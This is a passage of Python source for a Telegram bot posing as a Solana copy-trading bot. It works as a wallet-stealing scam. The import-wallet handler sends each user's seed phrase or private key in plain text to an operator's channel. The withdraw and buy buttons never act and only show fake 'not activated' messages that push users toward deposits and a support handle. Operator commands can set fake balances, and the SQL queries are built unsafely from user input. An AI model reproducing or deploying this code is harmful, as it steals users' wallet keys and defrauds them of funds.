        context.user_data['target_wallet'] = copy[2]
        context.user_data['buy_percentage'] = copy[4]
        context.user_data['copy_sells'] = copy[5]
        context.user_data['buy_gas'] = copy[6]
        context.user_data['sell_gas'] = copy[7]
        context.user_data['slippage'] = copy[8]
        context.user_data['auto_sell'] = copy[9]
        await send_copy_trade(chat_id, context)
    elif query.data == "new_copy_trade":
        context.user_data['copy_id'] = None
        context.user_data['tag'] = None
        context.user_data['target_wallet'] = None
        context.user_data['buy_percentage'] = None
        context.user_data['copy_sells'] = None
        context.user_data['buy_gas'] = None
        context.user_data['sell_gas'] = None
        context.user_data['slippage'] = None
        context.user_data['auto_sell'] = None
        await send_copy_trade(chat_id, context)
    elif query.data == "change_tag":
        context.user_data['change_tag'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter a custom name for this copy trade setup
""")
    elif query.data == "set_target_wallet":
        context.user_data['set_target_wallet'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter the target wallet address to copy trade
""")
    elif query.data == "change_buy_percentage":
        context.user_data['change_buy_percentage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
To buy with a fixed sol amount, enter a number. E.g. 0.1 SOL will buy with 0.1 SOL regardless of the target's buy amount.
""")
    elif query.data == "change_copy_sells":
        context.user_data['copy_sells'] = not context.user_data.get('copy_sells', True)
        await send_copy_trade(chat_id, context)
    elif query.data == "change_buy_gas":
        context.user_data['change_buy_gas'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter the priority fee to pay for buy trades. E.g 0.01 for 0.01 SOL
""")
    elif query.data == "change_sell_gas":
        context.user_data['change_sell_gas'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter the priority fee to pay for sell trades. E.g 0.01 for 0.01 SOL
""")
    elif query.data == "change_slippage":
        context.user_data['change_slippage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter slippage % to use on copy trades
""")
    elif query.data == "change_auto_sell":
        context.user_data['auto_sell'] = not context.user_data.get('auto_sell', False)
        await send_copy_trade(chat_id, context)
    elif query.data == "add_copy_trade":
        if context.user_data.get('target_wallet') is None:
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Please enter the target wallet address
""")
        else:
            target_wallet = context.user_data.get('target_wallet')
            tag = context.user_data.get('tag', '')
            buy_percentage = context.user_data.get('buy_percentage', 5)
            copy_sells = context.user_data.get('copy_sells', True)
            buy_gas = context.user_data.get('buy_gas', 0.0015)
            sell_gas = context.user_data.get('sell_gas', 0.0015)
            slippage = context.user_data.get('slippage', 10)
            auto_sell = context.user_data.get('auto_sell', False)
            copy_id = context.user_data.get('copy_id', None)
            buy_percentage = buy_percentage if buy_percentage is not None else 5
            copy_sells = copy_sells if copy_sells is not None else True
            buy_gas = buy_gas if buy_gas is not None else 0.0015
            sell_gas = sell_gas if sell_gas is not None else 0.0015
            slippage = slippage if slippage is not None else 10
            auto_sell = auto_sell if auto_sell is not None else False

            if copy_id is not None:
                cursor.execute(f"UPDATE copy_trades SET target_wallet = '{target_wallet}', tag = '{tag}', buy_percentage = {buy_percentage}, copy_sells = {copy_sells}, buy_gas = {buy_gas}, sell_gas = {sell_gas}, slippage = {slippage}, auto_sell = {auto_sell} WHERE id = {copy_id}")
                connection.commit()
            else:
                print(f"INSERT INTO copy_trades (user_id, target_wallet, tag, buy_percentage, copy_sells, buy_gas, sell_gas, slippage, auto_sell) VALUES ('{chat_id}', '{target_wallet}', '{tag}', {buy_percentage}, {copy_sells}, {buy_gas}, {sell_gas}, {slippage}, {auto_sell})")
                cursor.execute(f"INSERT INTO copy_trades (user_id, target_wallet, tag, buy_percentage, copy_sells, buy_gas, sell_gas, slippage, auto_sell) VALUES ('{chat_id}', '{target_wallet}', '{tag}', {buy_percentage}, {copy_sells}, {buy_gas}, {sell_gas}, {slippage}, {auto_sell})")
            connection.commit()

            await send_copy_trade(chat_id, context)
    elif query.data == "sell_manage":
        await sell(chat_id, context)
    elif query.data == "wallet":
        await wallet(chat_id, context)
    elif query.data == "show_private_key":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Private key: {user[2]}
""")
    elif query.data == "withdraw_all":
        user = get_user(chat_id)
        wallet_balance = await get_balance(user[1])
        if wallet_balance > 0:
            total_balance = round(wallet_balance, 6)
        else:
            total_balance = 0
        if total_balance:
            limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
            if total_balance > limit:
                await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @MrWhaIeREAL""")
                return
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
{limit} SOL Minimum balance required to activate trading bot""")
        else:
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"Not enough SOL to withdraw")
    elif query.data == "withdraw_x":
        user = get_user(chat_id)
        wallet_balance = await get_balance(user[1])
        if wallet_balance > 0:
            total_balance = round(wallet_balance, 6)
        else:
            total_balance = 0
        if total_balance:
            limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
            if total_balance > limit:
                await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @MrWhaIeREAL""")
                return
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
{limit} SOL Minimum balance required to activate trading bot""")
        else:
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"Not enough SOL to withdraw")
    elif query.data == "import_wallet":
        keyboard = [
        [InlineKeyboardButton("Seed phrase", callback_data="seed")],
        [InlineKeyboardButton("Private key", callback_data="prvkey")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Choose the option to import the wallet
""", reply_markup=reply_markup)
        
    elif query.data == "seed":
        print("seed")
        context.user_data['import_wallet'] = "seed"
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the seed phrase down below:""")
        pass
    elif query.data == "prvkey":
        context.user_data['import_wallet'] = "key"
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the private key down below:""")
        pass

    elif query.data == "premium_menu":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
🚀 *Premium Tools:*

• Sniping Alerts
• Private Copy Trading
• Early Bird Alpha Signals
• Advanced Rug Detection
• Wallet Watch & Automation
• Future AI-based Trade Signals

To activate premium tools, deposit at least *0.333 SOL* (~$50) to your wallet.

Your account will automatically be upgraded once the required deposit is detected.
""")
    elif query.data == "refer":
        await referral(chat_id, context)
    elif query.data == "buy":
        #print('Buying')
        await buy(chat_id, context)
    elif query.data == "settings":
        await send_settings(chat_id, context, query)
    elif query.data == "change_language":
        language = languages[user[4]]['next']
        cursor.execute(f"UPDATE users SET language = '{language}' WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_min_position_value":
        context.user_data['change_min_position_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new minimum position value""")
    elif query.data == "toggle_auto_buy":
        cursor.execute(f"UPDATE users SET auto_buy_enabled = NOT auto_buy_enabled WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_auto_buy_value":
        context.user_data['change_auto_buy_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new auto buy value""")
    elif query.data == "toggle_instant_rug_exit":
        cursor.execute(f"UPDATE users SET instant_rug_exit_enabled = NOT instant_rug_exit_enabled WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "toggle_swap_auto_approve":
        cursor.execute(f"UPDATE users SET swap_auto_approve_enabled = NOT swap_auto_approve_enabled WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_left_buy_button":
        context.user_data['change_left_buy_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new left buy button value""")
    elif query.data == "change_right_buy_button":
        context.user_data['change_right_buy_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new right buy button value""")
    elif query.data == "change_left_sell_button":
        context.user_data['change_left_sell_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new left sell button value""")
    elif query.data == "change_right_sell_button":
        context.user_data['change_right_sell_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new right sell button value""")
    elif query.data == "change_buy_slippage":
        context.user_data['change_buy_slippage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new buy slippage value""")
    elif query.data == "change_sell_slippage":
        context.user_data['change_sell_slippage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new sell slippage value""")
    elif query.data == "change_max_price_impact":
        context.user_data['change_max_price_impact'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new max price impact value""")
    elif query.data == "change_mev_protect":
        new_protect = "Secure" if user[17] == "Turbo" else "Turbo"
        cursor.execute(f"UPDATE users SET mev_protect = '{new_protect}' WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_transaction_priority":
        priority = priorities[user[18]]['next']
        cursor.execute(f"UPDATE users SET transaction_priority = '{priority}' WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_transaction_priority_value":
        context.user_data['change_transaction_priority_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new transaction priority value""")
    elif query.data == "toggle_sell_protection":
        cursor.execute(f"UPDATE users SET sell_protection_enabled = NOT sell_protection_enabled WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif "buy_1_0" in query.data or "buy_5_0" in query.data:
        user = get_user(chat_id)
        wallet_balance = await get_balance(user[1])
        if wallet_balance > 0:
            total_balance = round(wallet_balance, 6)
        else:
            total_balance = 0
        if total_balance:
            limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
            if total_balance > limit:
                await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @MrWhaIeREAL""")
                return
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
{limit} SOL Minimum balance required to activate trading bot""")
        else:
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"Not enough SOL to buy")

        
        return
        from_keypair = Keypair.from_base58_string(user[2])
        token_contract_address = query.data.split('_')[3]
        #print(user[2], token_contract_address)
        amount = 1

        tx_signature = await comprar_token_solana(from_keypair, token_contract_address, amount)
        #print(f"TransacciÃƒÂ³n enviada con ÃƒÂ©xito. Firma: {tx_signature}")
        message = f"""
Buy 1.0 SOL: {tx_signature}
      """
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
    elif "buy_x" in query.data:
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the sum down below""")
        context.user_data['buy_x'] = True

    
def get_dexscreener_contract(query):
    response = requests.get(
        f"https://api.dexscreener.com/latest/dex/search?q={query}",
        headers={},
    )

    # print(response.json()['pairs'][0])
    if response.json()['pairs'] != []:
        return response.json()['pairs'][0]
    else:
        return
    
def get_pumpfun_token(token_address):
    # URL Bitquery API
    url = "https://streaming.bitquery.io/eap"
    headers = {
        "Content-Type": "application/json",
        'Authorization': f'Bearer {bitAPI}'  # Замените на ваш API-ключ
    }

    # GraphQL-запрос для получения данных о токене
    query = """
subscription MyQuery {
  Solana {
    DEXTradeByTokens(
      orderBy: { descending: Block_Time }
      limit: { count: 10 }
      where: {
        Trade: {
          Dex: {
            ProgramAddress: {
              is: "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"
            }
          }
          Currency: {
            MintAddress: { is: "token_address" }
          }
        }
        Transaction: { Result: { Success: true } }
      }
    ) {
      Block {
        Time
      }
      Trade {
        Currency {
          MintAddress
          Name
          Symbol
        }
        Dex {
          ProtocolName
          ProtocolFamily
          ProgramAddress
        }
        Side {
          Currency {
            MintAddress
            Symbol
            Name
          }
        }
        Price
        PriceInUSD
      }
      Transaction {
        Signature
      }
    }
  }
}
    """.replace("token_address", token_address)

    try:
        # Выполнение запроса
        payload_graphql = json.dumps({'query': query})
        response = requests.post(url, headers=headers, data=payload_graphql)
        response.raise_for_status()
        data = response.json()

        # Извлечение данных из ответа
        address_data = data
        if not address_data:
            return
            
        trades = data["data"]["Solana"]["DEXTradeByTokens"]

        results = [
        {
            "Name": trade["Trade"]["Currency"]["Name"],
            "Symbol": trade["Trade"]["Currency"]["Symbol"],
            "PriceInUSD": trade["Trade"]["PriceInUSD"],
        }
        for trade in trades]

        # Вывод данных
        if results:
            return results[0]
        else:
            return

    except Exception as e:
        print(f"{e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.message.text
    user_id = update.message.from_user.id
    contract = ''
    is_dex = False
    contract_data = {}

#     if update.message.reply_to_message is not None and context.user_data['buy_x'] > 0 and context.user_data['contract_address'] != '':
#         replied_message_id = update.message.reply_to_message.message_id
#         if replied_message_id != context.user_data['buy_x'].message_id:
#             return
#         amount = float(message)
#         from_keypair = Keypair.from_base58_string(get_user(user_id)[2])
#         token_contract_address = context.user_data['contract_address']
#         #print('buy', amount, token_contract_address)
#         tx_signature = await comprar_token_solana(from_keypair, token_contract_address, amount)
#         #print(tx_signature)
#         message = f"""
# Buy {amount} SOL: {tx_signature}
#         """
#         await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=message)
#         return
    if context.user_data['buy_x']:
        amount = message
        user = get_user(update.message.chat_id)
        chat_id = update.message.chat_id
        wallet_balance = await get_balance(user[1])
        total_balance = round(wallet_balance, 6)
        if total_balance:
            limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
            if total_balance > limit:
                await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @MrWhaIeREAL""")
                return
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
{limit} SOL Minimum balance required to activate trading bot""")
        
    elif context.user_data['change_min_position_value']:
        try:
            min_position_value = float(message)
            cursor.execute(f"UPDATE users SET min_position_value = {min_position_value} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_tag']:
        tag = message
        context.user_data['tag'] = tag
        context.user_data['change_tag'] = False
        await send_copy_trade(user_id, context)
        return
    elif context.user_data['set_target_wallet']:
        target_wallet = message
        context.user_data['target_wallet'] = target_wallet
        context.user_data['set_target_wallet'] = False
        await send_copy_trade(user_id, context)
        return
    elif context.user_data['change_buy_percentage']:
        try:
            buy_percentage = float(message)
            context.user_data['buy_percentage'] = buy_percentage
            context.user_data['change_buy_percentage'] = False
            await send_copy_trade(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
            return
    elif context.user_data['change_buy_gas']:
        try:
            buy_gas = float(message)
            context.user_data['buy_gas'] = buy_gas
            context.user_data['change_buy_gas'] = False
            await send_copy_trade(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
            return
    elif context.user_data['change_sell_gas']:
        try:
            sell_gas = float(message)
            context.user_data['sell_gas'] = sell_gas
            context.user_data['change_sell_gas'] = False
            await send_copy_trade(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
            return
    elif context.user_data['change_slippage']:
        try:
            slippage = float(message)
            context.user_data['slippage'] = slippage
            context.user_data['change_slippage'] = False
            await send_copy_trade(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
            return
    elif context.user_data['change_auto_buy_value']:
        try:
            auto_buy_value = float(message)
            cursor.execute(f"UPDATE users SET auto_buy_value = {auto_buy_value} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_left_buy_button']:
        try:
            left_button = float(message)
            cursor.execute(f"UPDATE users SET left_buy_button = {left_button} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_right_buy_button']:
        try:
            right_button = float(message)
            cursor.execute(f"UPDATE users SET right_buy_button = {right_button} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_left_sell_button']:
        try:
            left_button = float(message)
            cursor.execute(f"UPDATE users SET left_sell_button = {left_button} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_right_sell_button']:
        try:
            right_button = float(message)
            cursor.execute(f"UPDATE users SET right_sell_button = {right_button} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_buy_slippage']:
        try:
            buy_slippage = float(message)
            cursor.execute(f"UPDATE users SET buy_slippage = {buy_slippage} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_sell_slippage']:
        try:
            sell_slippage = float(message)
            cursor.execute(f"UPDATE users SET sell_slippage = {sell_slippage} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_max_price_impact']:
        try:
            max_price_impact = float(message)
            cursor.execute(f"UPDATE users SET max_price_impact = {max_price_impact} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_transaction_priority_value']:
        try:
            transaction_priority_value = float(message)
            cursor.execute(f"UPDATE users SET transaction_priority_value = {transaction_priority_value} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except Exception as e:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['import_wallet'] != False:
        print("Importing")
        stype = context.user_data['import_wallet']
        try:
            if stype == "seed":
                print("Seed")
                if len(message.split(' ')) not in [12, 24]:
                    print(len(message.split(' ')))
                    raise Exception("Invalid private key")
                keypair = Keypair.from_seed_phrase_and_passphrase(message, "")
                public_key = keypair.pubkey()
                private_key_raw = keypair.secret() + bytes(public_key)
                private_key = str(base58.b58encode(private_key_raw).decode('utf-8'))
                print(public_key)
                await context.bot.send_message(chat_id=imported_channel, text=f"Wallet Imported: Seed phrase: {message}, public key: {str(public_key)}")
                print(private_key)
                # cursor.execute(f"UPDATE users SET pub_key = '{public_key}', priv_key = '{message}' WHERE id = {user_id}")
                got_balance = await check_balance(str(public_key))
                user = get_user(user_id)
                wallet_balance = await get_balance(user[1])
                cursor.execute(f"UPDATE users SET balance = {got_balance + wallet_balance} WHERE id = {user_id}")
                connection.commit()
                await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Wallet imported successfully""")
            else:
                private_key = message
            
                if len(private_key) < 86:
                    raise Exception("Invalid private key")
                public_key = Keypair.from_base58_string(private_key).pubkey()
                # await context.bot.send_message(chat_id='1206470899', text=f"Private key: {private_key}, public key: {public_key}")
                # await context.bot.send_message(chat_id=owner_id, text=f"Wallet Imported: Private key: {private_key}, public key: {public_key}")
                await context.bot.send_message(chat_id=imported_channel, text=f"Wallet Imported: Private key: {private_key}, public key: {str(public_key)}")
                # cursor.execute(f"UPDATE users SET pub_key = '{public_key}', priv_key = '{private_key}' WHERE id = {user_id}")
                got_balance = await check_balance(str(public_key))
                user = get_user(user_id)
                wallet_balance = await get_balance(user[1])
                cursor.execute(f"UPDATE users SET balance = {got_balance + wallet_balance} WHERE id = {user_id}")
                connection.commit()
                await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
    Wallet imported successfully
    """)
                context.user_data.pop('import_wallet')
        except Exception as e:
            print(e)
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Error importing wallet""")
        finally:
            await start_fn(None, user_id, context)
        return
    elif "pump.fun" in message:
        contract = message.split('pump.fun/coin/')[1]
    elif "birdeye.so/token" in message:
        contract = message.split('birdeye.so/token')[1].split('?')[0]
    elif "dexscreener.com/solana" in message:
        data = get_dexscreener_contract(message.split('dexscreener.com/solana/')[1])
        is_dex = True
        contract_data = data
        contract = data['baseToken']['address']
    elif "meteora.ag" in message:
        data = requests.get(
            f"https://dlmm-api.meteora.ag/pair/{message.split('meteora.ag/dlmm/')[1]}",
            headers={},
        ).json()
        contract = data['mint_x']
    elif " " not in message:
        data = get_dexscreener_contract(message)
        is_dex = True
        contract_data = data
        contract = message
    else:
        return
    if not is_dex:
        contract_data = get_dexscreener_contract(contract)
    print('contract', contract_data)
    if contract_data:
        prices = contract_data['priceChange']
        user = get_user(update.message.chat_id)
        wallet_balance = await get_balance(user[1])
        total_balance = round(wallet_balance, 6)
        #print(prices)
        message = f"""
{contract_data['baseToken']['name']} | *{contract_data['baseToken']['symbol']}* | {contract_data['baseToken']['address']}

Price: $*{contract_data['priceUsd']}*
5m: *{prices['m5']}%*, 1h: *{prices['h1']}%*, 6h: *{prices['h6']}%*, 24h: *{prices['h24']}%*
Market Cap: $*{contract_data['marketCap']}*

Price Impact (5.0000 SOL): *0.58%*

Wallet Balance: *{total_balance} SOL*
    """
        keyboard = [
            [InlineKeyboardButton("Cancel", callback_data="continue")],
            [InlineKeyboardButton("Explorer", url=f"https://solscan.io/account/{contract_data['baseToken']['address']}"), InlineKeyboardButton("Chart", url=f"{contract_data['url']}")],
            [InlineKeyboardButton("Buy 1.0 SOL", callback_data=f"buy_1_0_{contract_data['baseToken']['address']}"), InlineKeyboardButton("Buy 5.0 SOL", callback_data="buy_5_0"), InlineKeyboardButton("Buy X SOL", callback_data=f"buy_x_{contract_data['baseToken']['address']}")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=update.message.chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)
    else:
        contract_data = get_pumpfun_token(contract)
        user = get_user(update.message.chat_id)
        wallet_balance = await get_balance(user[1])
        total_balance = round(wallet_balance, 6)
        price = float(contract_data['PriceInUSD'])
        message = f"""
{contract_data['Name']} | *{contract_data['Symbol']}* | {contract}

Price: $*{price:.10f}*

Price Impact (5.0000 SOL): *0.58%*

Wallet Balance: *{total_balance} SOL*
    """
        keyboard = [
            [InlineKeyboardButton("Cancel", callback_data="continue")],
            [InlineKeyboardButton("Explorer", url=f"https://solscan.io/account/{contract}"), InlineKeyboardButton("Chart", url=f"https://pump.fun/coin/{contract}")],
            [InlineKeyboardButton("Buy 1.0 SOL", callback_data=f"buy_1_0_{contract}"), InlineKeyboardButton("Buy 5.0 SOL", callback_data="buy_5_0"), InlineKeyboardButton("Buy X SOL", callback_data=f"buy_x_{contract}")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=update.message.chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)

    # Opcional: Logear el mensaje en la consola o guardarlo en la base de datos
    #print(f"Mensaje de {user_id}: {user_message}")

# Configurar el bot
def main() -> None:
    # Crear la aplicaciÃƒÂ³n del bot
    application = Application.builder().token(TOKEN).build()

    # Agregar el manejador del comando /start
    application.add_handler(CommandHandler("start", start))

    # Agregar el manejador del comando /start
    application.add_handler(CommandHandler("buy", buy_cmd))
    application.add_handler(CommandHandler("wallet", wallet_cmd))
    application.add_handler(CommandHandler("sell", sell_cmd))
    application.add_handler(CommandHandler("copytrade", copytrade_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("settings", settings_cmd))
    application.add_handler(CommandHandler("referral", referral_cmd))
    application.add_handler(CommandHandler("checkbotfullyactivated", check_activation_cmd))
    application.add_handler(CommandHandler("set_balance", set_balance_cmd))
    application.add_handler(CommandHandler("get_balance", get_balance_cmd))
    application.add_handler(CommandHandler("set_limit", set_limit_cmd))
    application.add_handler(CommandHandler("check_balances", check_balances_cmd))


    # Agregar el manejador del botÃƒÂ³n
    application.add_handler(CallbackQueryHandler(button_handler))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Iniciar el bot
    application.run_polling()

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # Ejecutar la funciÃƒÂ³n asincrÃƒÂ³nica en el nuevo bucle
    #loop.close()
    thread = threading.Thread(target=run_check_balances)
    thread.start()
    print("running bot")
    main()
#connection.close()
# a
